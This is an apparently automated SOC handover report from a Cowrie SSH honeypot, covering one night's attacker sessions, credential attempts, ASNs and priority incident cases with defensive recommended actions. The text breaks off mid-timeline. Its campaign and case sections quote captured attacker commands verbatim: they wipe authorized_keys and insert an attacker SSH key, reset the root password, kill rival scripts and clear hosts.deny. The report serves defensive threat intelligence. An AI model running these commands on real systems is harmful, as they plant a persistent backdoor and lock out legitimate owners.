# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-26 |
| **Generated At** | 2026-03-26T22:28:19Z |
| **Shift Time** | 22:28 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **62** |
| Confirmed Threats | **51** |
| False Positives Filtered | **11** (17.7%) |
| Unique Attacker IPs | **25** |
| Countries of Origin | **11** |
| High Severity Cases | **9** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **53** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **20** |
| Unique Credential Pairs | **17** |
| Unique Usernames | **10** |
| Unique Passwords | **17** |
| Successful Auth Pairs | **9** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 9 |
| `345gs5662d34` | 2 |
| `operator` | 2 |
| `ubnt` | 1 |
| `centos` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 2 |
| `3245gs5662d34` | 2 |
| `root2024` | 2 |
| `pass` | 1 |
| `maintenance` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 2 |
| `root` | `3245gs5662d34` | 2 |
| `root` | `root2024` | 2 |
| `ubnt` | `pass` | 1 |
| `centos` | `maintenance` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `P@ssw0rd@321` | `197.248.104.19` | 2026-03-26T21:02:44 |
| `root` | `3245gs5662d34` | `197.248.104.19` | 2026-03-26T21:02:49 |
| `root` | `root2024` | `125.17.185.94` | 2026-03-26T21:07:24 |
| `root` | `root2024` | `77.106.78.215` | 2026-03-26T21:07:34 |
| `root` | `claim` | `103.171.69.82` | 2026-03-26T21:31:40 |
| `root` | `3245gs5662d34` | `103.171.69.82` | 2026-03-26T21:31:42 |
| `root` | `sasa123` | `180.76.96.235` | 2026-03-26T21:33:50 |
| `root` | `115599` | `180.153.91.15` | 2026-03-26T21:39:39 |
| `root` | `!QAZ9ijn` | `14.103.121.78` | 2026-03-26T21:46:07 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:hPToZzNInBNl"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `180.76.96.235`, `180.153.91.15`, `14.103.121.78`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `197.248.104.19`, `103.171.69.82`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **25** |
| Unique ASNs | **18** |
| High-Risk ASNs | **15** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS16509` | Amazon.com, Inc. | 3 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS9829` | National Internet Backbone | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS37061` | Safaricom Limited | 1 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (9)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-3fa840fb5fdd

| Field | Detail |
|---|---|
| **Source IP** | `197.248.104[.]19` |
| **First Seen** | 2026-03-26 21:02 |
| **Last Seen** | 2026-03-26 21:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 21:02:43` | `cowrie.session.connect` |
| `2026-03-26 21:02:43` | `cowrie.client.version` |
| `2026-03-26 21:02:44` | `cowrie.client.kex` |
| `2026-03-26 21:02:44` | `cowrie.login.success` |
| `2026-03-26 21:02:45` | `cowrie.session.params` |
| `2026-03-26 21:02:45` | `cowrie.command.input` |
| `2026-03-26 21:02:45` | `cowrie.command.failed` |
| `2026-03-26 21:02:45` | `cowrie.log.closed` |
| `2026-03-26 21:02:46` | `cowrie.session.params` |
| `2026-03-26 21:02:46` | `cowrie.command.input` |
| `2026-03-26 21:02:46` | `cowrie.session.file_download` |
| `2026-03-26 21:02:46` | `cowrie.log.closed` |
| `2026-03-26 21:02:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.104[.]19` to AbuseIPDB if not already reported
- [ ] Block `197.248.104[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21eaf61f90ec

| Field | Detail |
|---|---|
| **Source IP** | `197.248.104[.]19` |
| **First Seen** | 2026-03-26 21:02 |
| **Last Seen** | 2026-03-26 21:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 21:02:48` | `cowrie.session.connect` |
| `2026-03-26 21:02:48` | `cowrie.client.version` |
| `2026-03-26 21:02:49` | `cowrie.client.kex` |
| `2026-03-26 21:02:49` | `cowrie.login.success` |
| `2026-03-26 21:02:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.104[.]19` to AbuseIPDB if not already reported
- [ ] Block `197.248.104[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-236f63846c95

| Field | Detail |
|---|---|
| **Source IP** | `125.17.185[.]94` |
| **First Seen** | 2026-03-26 21:07 |
| **Last Seen** | 2026-03-26 21:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 21:07:22` | `cowrie.session.connect` |
| `2026-03-26 21:07:23` | `cowrie.client.version` |
| `2026-03-26 21:07:23` | `cowrie.client.kex` |
| `2026-03-26 21:07:24` | `cowrie.login.success` |
| `2026-03-26 21:07:24` | `cowrie.direct-tcpip.request` |
| `2026-03-26 21:07:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.17.185[.]94` to AbuseIPDB if not already reported
- [ ] Block `125.17.185[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4facfff2c29c

| Field | Detail |
|---|---|
| **Source IP** | `77.106.78[.]215` |
| **First Seen** | 2026-03-26 21:07 |
| **Last Seen** | 2026-03-26 21:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 21:07:31` | `cowrie.session.connect` |
| `2026-03-26 21:07:32` | `cowrie.client.version` |
| `2026-03-26 21:07:32` | `cowrie.client.kex` |
| `2026-03-26 21:07:34` | `cowrie.login.success` |
| `2026-03-26 21:07:35` | `cowrie.direct-tcpip.request` |
| `2026-03-26 21:07:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.106.78[.]215` to AbuseIPDB if not already reported
- [ ] Block `77.106.78[.]215` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4e570f24cec

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]82` |
| **First Seen** | 2026-03-26 21:31 |
| **Last Seen** | 2026-03-26 21:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 21:31:39` | `cowrie.session.connect` |
| `2026-03-26 21:31:39` | `cowrie.client.version` |
| `2026-03-26 21:31:40` | `cowrie.client.kex` |
| `2026-03-26 21:31:40` | `cowrie.login.success` |
| `2026-03-26 21:31:40` | `cowrie.session.params` |
| `2026-03-26 21:31:40` | `cowrie.command.input` |
| `2026-03-26 21:31:40` | `cowrie.command.failed` |
| `2026-03-26 21:31:40` | `cowrie.log.closed` |
| `2026-03-26 21:31:40` | `cowrie.session.params` |
| `2026-03-26 21:31:40` | `cowrie.command.input` |
| `2026-03-26 21:31:40` | `cowrie.session.file_download` |
| `2026-03-26 21:31:40` | `cowrie.log.closed` |
| `2026-03-26 21:31:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]82` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2422753a1b5c

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]82` |
| **First Seen** | 2026-03-26 21:31 |
| **Last Seen** | 2026-03-26 21:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 21:31:42` | `cowrie.session.connect` |
| `2026-03-26 21:31:42` | `cowrie.client.version` |
| `2026-03-26 21:31:42` | `cowrie.client.kex` |
| `2026-03-26 21:31:42` | `cowrie.login.success` |
| `2026-03-26 21:31:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]82` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b653f5f270e

| Field | Detail |
|---|---|
| **Source IP** | `180.76.96[.]235` |
| **First Seen** | 2026-03-26 21:33 |
| **Last Seen** | 2026-03-26 21:34 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:hPToZzNInBNl"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 21:33:49` | `cowrie.session.connect` |
| `2026-03-26 21:33:49` | `cowrie.client.version` |
| `2026-03-26 21:33:49` | `cowrie.client.kex` |
| `2026-03-26 21:33:50` | `cowrie.login.success` |
| `2026-03-26 21:33:51` | `cowrie.session.params` |
| `2026-03-26 21:33:51` | `cowrie.command.input` |
| `2026-03-26 21:33:51` | `cowrie.command.failed` |
| `2026-03-26 21:33:51` | `cowrie.log.closed` |
| `2026-03-26 21:33:51` | `cowrie.session.params` |
| `2026-03-26 21:33:51` | `cowrie.command.input` |
| `2026-03-26 21:33:51` | `cowrie.session.file_download` |
| `2026-03-26 21:33:51` | `cowrie.log.closed` |
| `2026-03-26 21:34:08` | `cowrie.session.params` |
| `2026-03-26 21:34:08` | `cowrie.command.input` |
| `2026-03-26 21:34:08` | `cowrie.log.closed` |
| `2026-03-26 21:34:08` | `cowrie.session.params` |
| `2026-03-26 21:34:08` | `cowrie.command.input` |
| `2026-03-26 21:34:09` | `cowrie.log.closed` |
| `2026-03-26 21:34:09` | `cowrie.session.params` |
| `2026-03-26 21:34:09` | `cowrie.command.input` |
| `2026-03-26 21:34:11` | `cowrie.session.file_download` |
| `2026-03-26 21:34:11` | `cowrie.log.closed` |
| `2026-03-26 21:34:11` | `cowrie.session.params` |
| `2026-03-26 21:34:11` | `cowrie.command.input` |
| `2026-03-26 21:34:12` | `cowrie.log.closed` |
| `2026-03-26 21:34:12` | `cowrie.session.params` |
| `2026-03-26 21:34:12` | `cowrie.command.input` |
| `2026-03-26 21:34:12` | `cowrie.log.closed` |
| `2026-03-26 21:34:13` | `cowrie.session.params` |
| `2026-03-26 21:34:13` | `cowrie.command.input` |
| `2026-03-26 21:34:13` | `cowrie.command.input` |
| `2026-03-26 21:34:13` | `cowrie.log.closed` |
| `2026-03-26 21:34:14` | `cowrie.session.params` |
| `2026-03-26 21:34:14` | `cowrie.command.input` |
| `2026-03-26 21:34:14` | `cowrie.log.closed` |
| `2026-03-26 21:34:15` | `cowrie.session.params` |
| `2026-03-26 21:34:15` | `cowrie.command.input` |
| `2026-03-26 21:34:15` | `cowrie.log.closed` |
| `2026-03-26 21:34:16` | `cowrie.session.params` |
| `2026-03-26 21:34:16` | `cowrie.command.input` |
| `2026-03-26 21:34:16` | `cowrie.log.closed` |
| `2026-03-26 21:34:17` | `cowrie.session.params` |
| `2026-03-26 21:34:17` | `cowrie.command.input` |
| `2026-03-26 21:34:17` | `cowrie.log.closed` |
| `2026-03-26 21:34:17` | `cowrie.session.params` |
| `2026-03-26 21:34:17` | `cowrie.command.input` |
| `2026-03-26 21:34:18` | `cowrie.log.closed` |
| `2026-03-26 21:34:18` | `cowrie.session.params` |
| `2026-03-26 21:34:18` | `cowrie.command.input` |
| `2026-03-26 21:34:18` | `cowrie.log.closed` |
| `2026-03-26 21:34:19` | `cowrie.session.params` |
| `2026-03-26 21:34:19` | `cowrie.command.input` |
| `2026-03-26 21:34:19` | `cowrie.log.closed` |
| `2026-03-26 21:34:19` | `cowrie.session.params` |
| `2026-03-26 21:34:19` | `cowrie.command.input` |
| `2026-03-26 21:34:20` | `cowrie.log.closed` |
| `2026-03-26 21:34:21` | `cowrie.session.params` |
| `2026-03-26 21:34:21` | `cowrie.command.input` |
| `2026-03-26 21:34:21` | `cowrie.log.closed` |
| `2026-03-26 21:34:22` | `cowrie.session.params` |
| `2026-03-26 21:34:22` | `cowrie.command.input` |
| `2026-03-26 21:34:22` | `cowrie.log.closed` |
| `2026-03-26 21:34:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.96[.]235` to AbuseIPDB if not already reported
- [ ] Block `180.76.96[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-186c527d398e

| Field | Detail |
|---|---|
| **Source IP** | `180.153.91[.]15` |
| **First Seen** | 2026-03-26 21:39 |
| **Last Seen** | 2026-03-26 21:39 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:55n8GsGxkT4r"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 21:39:38` | `cowrie.session.connect` |
| `2026-03-26 21:39:38` | `cowrie.client.version` |
| `2026-03-26 21:39:38` | `cowrie.client.kex` |
| `2026-03-26 21:39:39` | `cowrie.login.success` |
| `2026-03-26 21:39:39` | `cowrie.session.params` |
| `2026-03-26 21:39:39` | `cowrie.command.input` |
| `2026-03-26 21:39:39` | `cowrie.command.failed` |
| `2026-03-26 21:39:39` | `cowrie.log.closed` |
| `2026-03-26 21:39:39` | `cowrie.session.params` |
| `2026-03-26 21:39:39` | `cowrie.command.input` |
| `2026-03-26 21:39:40` | `cowrie.session.file_download` |
| `2026-03-26 21:39:40` | `cowrie.log.closed` |
| `2026-03-26 21:39:52` | `cowrie.session.params` |
| `2026-03-26 21:39:52` | `cowrie.command.input` |
| `2026-03-26 21:39:52` | `cowrie.log.closed` |
| `2026-03-26 21:39:52` | `cowrie.session.params` |
| `2026-03-26 21:39:52` | `cowrie.command.input` |
| `2026-03-26 21:39:52` | `cowrie.log.closed` |
| `2026-03-26 21:39:53` | `cowrie.session.params` |
| `2026-03-26 21:39:53` | `cowrie.command.input` |
| `2026-03-26 21:39:53` | `cowrie.session.file_download` |
| `2026-03-26 21:39:53` | `cowrie.log.closed` |
| `2026-03-26 21:39:53` | `cowrie.session.params` |
| `2026-03-26 21:39:53` | `cowrie.command.input` |
| `2026-03-26 21:39:53` | `cowrie.log.closed` |
| `2026-03-26 21:39:53` | `cowrie.session.params` |
| `2026-03-26 21:39:53` | `cowrie.command.input` |
| `2026-03-26 21:39:54` | `cowrie.log.closed` |
| `2026-03-26 21:39:54` | `cowrie.session.params` |
| `2026-03-26 21:39:54` | `cowrie.command.input` |
| `2026-03-26 21:39:54` | `cowrie.command.input` |
| `2026-03-26 21:39:54` | `cowrie.log.closed` |
| `2026-03-26 21:39:54` | `cowrie.session.params` |
| `2026-03-26 21:39:54` | `cowrie.command.input` |
| `2026-03-26 21:39:54` | `cowrie.log.closed` |
| `2026-03-26 21:39:55` | `cowrie.session.params` |
| `2026-03-26 21:39:55` | `cowrie.command.input` |
| `2026-03-26 21:39:55` | `cowrie.log.closed` |
| `2026-03-26 21:39:55` | `cowrie.session.params` |
| `2026-03-26 21:39:55` | `cowrie.command.input` |
| `2026-03-26 21:39:55` | `cowrie.log.closed` |
| `2026-03-26 21:39:56` | `cowrie.session.params` |
| `2026-03-26 21:39:56` | `cowrie.command.input` |
| `2026-03-26 21:39:56` | `cowrie.log.closed` |
| `2026-03-26 21:39:56` | `cowrie.session.params` |
| `2026-03-26 21:39:56` | `cowrie.command.input` |
| `2026-03-26 21:39:56` | `cowrie.log.closed` |
| `2026-03-26 21:39:56` | `cowrie.session.params` |
| `2026-03-26 21:39:56` | `cowrie.command.input` |
| `2026-03-26 21:39:57` | `cowrie.log.closed` |
| `2026-03-26 21:39:57` | `cowrie.session.params` |
| `2026-03-26 21:39:57` | `cowrie.command.input` |
| `2026-03-26 21:39:57` | `cowrie.log.closed` |
| `2026-03-26 21:39:57` | `cowrie.session.params` |
| `2026-03-26 21:39:57` | `cowrie.command.input` |
| `2026-03-26 21:39:58` | `cowrie.log.closed` |
| `2026-03-26 21:39:58` | `cowrie.session.params` |
| `2026-03-26 21:39:58` | `cowrie.command.input` |
| `2026-03-26 21:39:58` | `cowrie.log.closed` |
| `2026-03-26 21:39:58` | `cowrie.session.params` |
| `2026-03-26 21:39:58` | `cowrie.command.input` |
| `2026-03-26 21:39:58` | `cowrie.log.closed` |
| `2026-03-26 21:39:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.153.91[.]15` to AbuseIPDB if not already reported
- [ ] Block `180.153.91[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d50ca1a2ec57

| Field | Detail |
|---|---|
| **Source IP** | `14.103.121[.]78` |
| **First Seen** | 2026-03-26 21:46 |
| **Last Seen** | 2026-03-26 21:46 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:0e0yKCVCB3Cc"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 21:46:06` | `cowrie.session.connect` |
| `2026-03-26 21:46:06` | `cowrie.client.version` |
| `2026-03-26 21:46:06` | `cowrie.client.kex` |
